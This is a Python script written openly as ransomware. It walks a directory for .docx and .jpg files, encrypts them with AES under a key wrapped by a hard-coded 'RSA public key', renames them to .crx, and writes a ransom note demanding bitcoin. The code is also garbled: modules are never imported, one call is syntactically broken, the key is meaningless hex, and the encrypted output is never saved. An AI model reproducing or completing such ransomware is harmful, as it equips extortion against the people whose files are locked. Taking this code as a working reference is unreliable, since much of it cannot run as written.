import os
import sys
import time
import hashlib
import random
from datetime import datetime

# --- Configuration ---
RSA_PUBLIC_KEY = "30 82 BCE0 94 CF 5F A7 0A 16 2F B5 F9 C8 0C 2B E2 30 4E 84 BC 54 BE 47 74 1B B0 3F" # Replace with RSA Public Key
# RSA_PUBLIC_KEY = "30 82 BCE0 94 CF 5F A7 0A 16 2F B5 F9 C8 0C 2B E2 30 4E 84 BC 54 BE 47 74 1B B0 3F"

# --- Utility Functions ---
def get_window_handle(title:str) -> str | None :
    """Gets the handle of a window by title, returns None if not found."""
    try:
        window = pygetwindow.getWindowsWithHeadless=True[0] # Find the first window
        return window.handle
    except Exception as e:
        print(f"Error getting window handle: {e}")
        return None

def get_mouse_position():
    """Gets the current mouse position on the screen and returns it as a tuple (x, y)."""
    try:
        x, y = pyautogui.position()
        return x, y
    except Exception as e:
        print(f"Error getting mouse position: {e}")
        return 0, 0

def check_admin():
    """Checks if the program has administrator privileges."""
    try:
        # Attempt to create a file in the admin directory.
        os.makedirs("C:\\ProgramData\\CryptoRansom\\Admin", exist_ok=True) # Creates Admin folder if needed
        return True
    except Exception as e:
        print(f"Administrator check failed: {e}")
        return False

def run_command(command):
    """Runs a command in the system shell using the 'cmd' interpreter."""
    try:
        os.system(command)
    except Exception as e:
        print(f"Command execution failed: {e}")


# --- Crypto Functions ---

def hash_file(filename, algorithm="sha256"):
    """Hashes a file using the specified algorithm."""
    hasher = hashlib.new(algorithm)
    try:
        with open(filename, "rb") as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                hasher.update(chunk)
    except Exception as e :
        print (f"Error calculating SHA256 for file {filename}: {e}")
        return None

    return hasher.hexdigest()

def encrypt_file(filepath, key):
    """Encrypts a file using the AES algorithm."""
    try:
        with open(filepath, "rb") as f:
            data = f.read()

        # --- Encryption ---
        key = bytes.fromhex(key) # Convert hex to bytes
        if len(data) % 16 != 0 :
            padding_length = 16 - (len(data) % 16)
            data += b'\x00' * padding_length

        encrypted = AES.encrypt(data, key) # Encrypt the file with AES
    except Exception as e:
        print (f"Error encrypting file {filepath}: {e}")
        return None

    return encrypted

def decrypt_file(encrypted_data):
    """Decrypts a file using the AES algorithm."""
    try:
        # --- Decryption ---
        key = bytes.fromhex(KEY_HEX) # Convert hex to bytes
        decrypted = AES.decrypt(encrypted_data, key)  # Decrypt the file with AES
    except Exception as e :
        print (f"Error decrypting file: {e}")
        return None

    return decrypted


# --- Ransom Functions ---

def create_ransom_message(title):
    """Creates the ransom message content based on window title."""
    if "Settings" in title or "Control Panel" in title :
        message = f"""
**Your Files Have Been Encrypted!**

To decrypt them, you must send \$50 to our bitcoin wallet. The longer you wait, the higher the price becomes!

You can see your encrypted file hashes below:
{hash_file(os.path.join(OUTPUT_DIR, "settings.txt"))} 
{hash_file(os.path.join(OUTPUT_DIR, "password.txt"), "sha256")}


We are currently running a scan on your system and will be in touch soon!

Thank you for your prompt response.
"""
    elif "Chrome" in title or "Firefox" in title :
        message = f"""
**Your Files Have Been Encrypted!**

To decrypt them, you must send \$50 to our bitcoin wallet. The longer you wait, the higher the price becomes!

You can see your encrypted file hashes below:
{hash_file(os.path.join(OUTPUT_DIR, "settings.txt"))} 
{hash_file(os.path.join(OUTPUT_DIR, "password.txt"), "sha256")}


We are currently running a scan on your system and will be in touch soon!

Thank you for your prompt response.
"""
    else :
        message = f"""
**Your Files Have Been Encrypted!**

To decrypt them, you must send \$50 to our bitcoin wallet. The longer you wait, the higher the price becomes!

You can see your encrypted file hashes below:
{hash_file(os.path.join(OUTPUT_DIR, "settings.txt"))} 
{hash_file(os.path.join(OUTPUT_DIR, "password.txt"), "sha256")}


We are currently running a scan on your system and will be in touch soon!

Thank you for your prompt response.
"""

    return message

def get_encrypted_files():
    """Gets the list of files to be encrypted."""
    files = []
    try:
        for filename in os.listdir(OUTPUT_DIR):
            filepath = os.path.join(OUTPUT_DIR, filename)
            if os.path.isfile(filepath) and filename.endswith(".docx") or filename.endswith(".jpg"):
                files.append((filepath, filename))
    except Exception as e :
        print (f"Error getting list of files: {e}")

    return files


# --- Key Generation & RSA Encryption ---

def generate_local_key():
    """Generates a random AES key."""
    key = random.urandom(32) # 256 bits
    return key.hex()

def encrypt_rsa_key(local_key, public_key):
    """Encrypts the local AES Key using RSA."""
    try:
        encrypted_data = rsa.encrypt(local_key.encode('utf-8'), public_key)
        return encrypted_data.hex()
    except Exception as e :
        print (f"Error encrypting key with RSA: {e}")
        return None

def get_rsa_key():
    """Gets the RSA public key."""
    return "30 82 BCE0 94 CF 5F A7 0A 16 2F B5 F9 C8 0C 2B E2 30 4E 84 BC 54 BE 47 74 1B B0 3F"

# --- Main Function ---
if __name__ == "__main__":

    # --- Setup ---
    OUTPUT_DIR = "C:\\ProgramData\\CryptoRansom\\Output" # Creates a hidden folder for encrypted files.
    FILETYPES = [".docx", ".jpg"] # The file types to be encrypted

    # --- Generate RSA Key (if needed) ---
    rsa_key = get_rsa_key()
    if not rsa_key :
        print("RSA Key Generation Failed.")
        sys.exit(1)

    # --- Generate AES Key (for encryption) ---
    local_key = generate_local_key()
    encrypted_local_key = encrypt_rsa_key(local_key, rsa_key) # Encrypt the local AES key with RSA
    if not encrypted_local_key :
        print("RSA Key Encryption Failed.")
        sys.exit(1)

    # --- Get List of Files to be Encrypted ---
    files = get_encrypted_files()

    # --- Process Files for Encryption ---
    for filepath, filename in files:
        try:
            # Encrypt File Content (AES)
            encrypted_data = encrypt_file(filepath, encrypted_local_key)

            if not encrypted_data :
                continue # If encryption fails, move on to the next file.

            # Rename File Extension to .CRX
            new_filename = f"{os.path.splitext(filename)[0]}.crx"
            new_filepath = os.path.join(OUTPUT_DIR, new_filename)
            os.rename(filepath, new_filepath) # Rename the file

        except Exception as e:
            print (f"Error processing file {filename}: {e}")


    # --- Create Ransom Note File and Put it in the Output Directory ---
    ransom_message = create_ransom_message(get_window_handle(title))
    with open(os.path.join(OUTPUT_DIR, "readme.txt"), "w") as f:
        f.write(ransom_message)

    print("Encryption complete! Check the output folder for instructions and payment URL.")
